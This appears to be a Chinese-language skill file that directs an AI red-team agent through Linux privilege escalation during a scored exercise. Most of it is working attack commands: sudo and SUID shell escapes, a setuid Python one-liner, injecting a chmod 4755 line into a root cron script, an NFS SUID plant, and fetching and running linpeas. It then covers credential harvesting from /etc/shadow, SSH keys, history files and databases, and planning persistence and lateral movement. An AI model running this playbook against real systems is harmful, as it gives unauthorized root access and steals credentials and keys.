---
name: linux-privesc
description: Linux 本地提权：SUID/sudo/capabilities/cron/服务/内核/NFS/容器逃逸的枚举命令与最短利用路径
whenToUse: 已拿到普通用户 shell（WebShell/RCE/弱口令），需要 root 读 /etc/shadow、拿数据库与内网凭据，或把普通权限升级成得分项
role: internal
enabled: true
---

# Linux 提权（从 www-data 到 root）

**提权本身不是目标**：目标是 root 能读到的**凭据、内网配置、密钥**，以及 `server-host` 权限分。
所以枚举要有方向感——先找"这台机上有什么值得拿的"，再找路。

## 一、30 秒自动枚举（先跑这个，再手工）

```bash
# 一行版：不给对方留脚本文件时用（输出贴回本地看）
id; uname -a; cat /etc/os-release | head -3; sudo -l 2>/dev/null; \
getcap -r / 2>/dev/null | head -20; ls -la /etc/passwd /etc/shadow 2>/dev/null

# 有上传通道就上 linpeas（最省时间）
curl -sSLo /tmp/lp.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh -q 2>/dev/null | tee /tmp/lp.out | tail -80
```

linpeas 输出只看这几段（其余是噪音）：`SUID`、`sudo`、`Capabilities`、`Cron jobs`、
`Writable files`、`Network Information`、`Interesting files`。命中一条就进入对应小节。

## 二、按命中率排序的利用路径

### 1) sudo 免密（最干净，几乎无副作用）

```bash
sudo -l
# 看到 (ALL) NOPASSWD: /usr/bin/vim 这类 → 查 GTFOBins
sudo vim -c ':!sh'                            # vim 类
sudo find / -exec sh \;                       # find 类
sudo awk 'BEGIN {system("sh")}'                # awk 类
sudo less /etc/hosts                           # 进入后 !sh
```

### 2) SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null | tee runs/suid.txt
# 对照 GTFOBins：nmap --interactive、find -exec、bash -p、python -c
find / -perm -4000 -name bash -exec {} -p \; 2>/dev/null
```

### 3) Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep 的 python/perl → 直接 setuid(0)
python3 -c 'import os; os.setuid(0); os.system("sh")'
# cap_dac_read_search → 能不能读 /etc/shadow 就看它
```

### 4) 计划任务与可写脚本（等一分钟就有 root）

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null
ls -la /var/spool/cron/ /etc/cron.d/ 2>/dev/null
# 找 root 定时执行、但 world-writable 的脚本
find /etc/cron* /opt /usr/local/bin -writable -type f 2>/dev/null | head -20
# 命中后往脚本里追加（备份原文件！）
echo 'chmod 4755 $(which bash)' >> /opt/backup.sh
```

### 5) 服务与配置文件里的凭据（常常比提权更快）

```bash
# 应用配置里的数据库/Redis/云 AK —— 直接就是得分点，不一定要 root
grep -rlE 'password|passwd|secret|accessKey' /var/www /opt /home 2>/dev/null | head -20
grep -rhE 'jdbc:[a-z]+://[^ "]+' /var/www /opt 2>/dev/null | head
cat ~/.ssh/id_rsa ~/.bash_history 2>/dev/null | head -40
# 数据库本机免密（很多 Web 机 root 空口令只允许本地）
mysql -uroot -e 'select user,password from mysql.user' 2>/dev/null
redis-cli -h 127.0.0.1 keys '*' 2>/dev/null | head
```

### 6) 内核与已知 CVE（最后再试，会重启风险）

```bash
uname -r
# 先离线判断，再决定要不要上 exp（本机跑 kernel exploit 有宕机风险，先在演练机验证）
# 常见：CVE-2021-4034 PwnKit（polkit）、CVE-2022-0847 DirtyPipe、CVE-2016-5195 DirtyCow
ls -la $(which pkexec) 2>/dev/null           # PwnKit 前置
```

> **内核 exp 纪律**：先在**你自己的同版本环境**验证 exp 可用；目标上跑之前确认业务可中断；
> 打崩一台边界机会丢掉整条入口，得不偿失。

### 7) NFS / 挂载 / 容器

```bash
showmount -e <target>                     # no_root_squash 时本地挂载写 SUID
mount -t nfs <target>:/export /mnt 2>/dev/null && cp $(which bash) /mnt/x && chmod 4755 /mnt/x
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup | head -3    # 判断是不是容器内
```

容器内逃逸见技能 `cloud-container`（docker socket / 特权容器 / hostPath）。

## 三、拿到 root 之后（这一步才产生得分）

```bash
# 1) 凭据收割（演职员表：这些才是报告里的"拿到什么"）
cat /etc/shadow                                  # 哈希 → 离线破解（hashcat -m 1800）
grep -hE 'root|password' /root/.my.cnf /root/.pgpass 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null               # 拿私钥 → 横向
cat /root/.bash_history 2>/dev/null | tail -50  # 历史命令里常有数据库密码、内网地址
# 2) 内网位置（为下一阶段铺路）
ip a; ip route; cat /etc/hosts; arp -a | head -20
ss -antp | head -30                              # 本机在连谁 = 内网拓扑线索
# 3) 落地持久入口（演练范围允许时）：SSH key 或隧道，优先隧道（技能 suo5-tunnel）
```

## 四、纪律

1. **先备份再改**：`cp /opt/backup.sh /opt/backup.sh.bak.$(date +%s)`，改完确认生效再决定是否还原。
2. **不锁死自己**：改 `/etc/passwd`、加 root 用户这类操作要评估风险（对方运维一看就知道）。
3. **不删日志**：演练要的是可复现证据，删日志既无意义又破坏现场。
4. **一次只改一个变量**：同时动 cron + SUID 出了问题不知道是哪一步。
5. **优先"读"而不是"改"**：能读到密码就不需要提权；能用应用配置直连数据库就不需要 root。

## 五、落库（强制）

1. 提权成功：`redteam_vuln_add`（`title` = `本地提权（sudo 免密 vim）`，`target` 带端口/主机名，
   `evidence` 贴 `id` 输出，`gained` = `server-host`）。
2. 拿到 root：`redteam_score_hit`（`server-host`，`evidence` 写「资产:端口｜root shell 已实测」）。
3. 凭据：`redteam_credential_add`（`source=本地文件`/`提权后读取`，`tool` 写命令）。
4. 横向入口：隧道 → `redteam_tunnel_add`；私钥/账号写进 `access`。
5. 每步 `redteam_chain_add`（`stage_code=internal`，`tool` 写实际命令、`result` 写回显），
   并把 `runs/suid.txt`、linpeas 输出摘要一起挂到攻击步骤的 `result` 里。
